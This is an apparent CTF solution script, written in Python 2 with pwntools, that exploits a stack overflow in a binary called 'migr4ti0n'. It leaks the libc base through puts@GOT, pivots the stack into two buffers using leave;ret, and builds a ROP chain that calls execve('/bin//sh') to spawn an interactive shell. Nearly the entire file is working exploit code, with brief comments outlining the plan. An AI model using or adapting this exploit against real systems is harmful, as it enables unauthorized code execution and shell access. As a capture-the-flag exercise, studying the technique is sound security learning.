from pwn import *

context.arch = 'amd64'


#first need to find the migration addr for buf1 buf2
#the offset to ret address is 56 bytes,so the rest (128-56)72 bytes
#is the total length that rop chain,about 9 rop

#need another buf to store the rop chain,the addr i pick is ,buf1 -> 0x0602000 - 0x300
#by using puts to leak lib_base,then store large rop chain in buf1 to set regiters
#finnal syscall

#there is a problem that this elf is dynamic linked,so there is no such a rop chain to call execute('/bin//sh')
#solution 1 : get rop chain in lib.so.6
#solution 2 : set '/bin//sh\0' to variable t,set regiter by gadget in ./migr4ti0n

#about solution 2,i can't find such gadget fit that condition to set ax,so i use lib.so.6 to practice both.
r = remote('127.0.0.1',8888)
#r = remote('csie.ctf.tw',10130)

r.recvuntil(':')
#the offset from buf to ret is 56,the rbp is 48


buf1_addr = 0x601d00                #0x0602000 - 0x300
puts_plt = 0x4004d8
puts_got = 0x600fd8
read_plt = 0x4004e0                 #read(rax,rsi,rdx);
pop_rdi = 0x4006b3
pop_rsi_r15 = 0x4006b1
pop_rdx = 0x4006d4
read_len = 0x200    #512 byte -> 64 gadget
addr1 = 0x400639


pop_rax_ret = 0x33544               # pop rax ; ret | lib.so.6

rop1 = 'X'*48 + flat([buf1_addr, pop_rdi, puts_got, puts_plt, pop_rsi_r15, buf1_addr, 0x123, pop_rdx, read_len, addr1] )
r.send(rop1)

#get the leak info
r.recvline()
puts_addr = u64(r.recvline().strip().ljust(8,'\0'))
puts_off = 0x6f690
libc_base = puts_addr - puts_off
gets_off = 0x6ed80
gets_addr = libc_base + gets_off
print 'libc base',hex(libc_base)
#set the second read rop input
#for practice purpose,using gets to reach sencond migraction.
buf2_addr = 0x601300
leave_ret = 0x40064a
#get(rdi)
rop2 = flat([buf2_addr, pop_rdi, buf2_addr, gets_addr, leave_ret])
r.send(rop2)


#real syscall
pop_rax_off = 0x33544               #0x0000000000033544 : pop rax ; ret | libc.so.6
pop_rax = pop_rax_off + libc_base
syscall_off = 0xbc375
syscall = syscall_off + libc_base
rop3 = flat([0x12345678, pop_rax, 0x3b, pop_rsi_r15, 0x0, 0x0, pop_rdx, 0x0, pop_rdi,buf2_addr + 8*11, syscall])


r.sendline(rop3 + '/bin//sh\0')
r.interactive()
r.close()



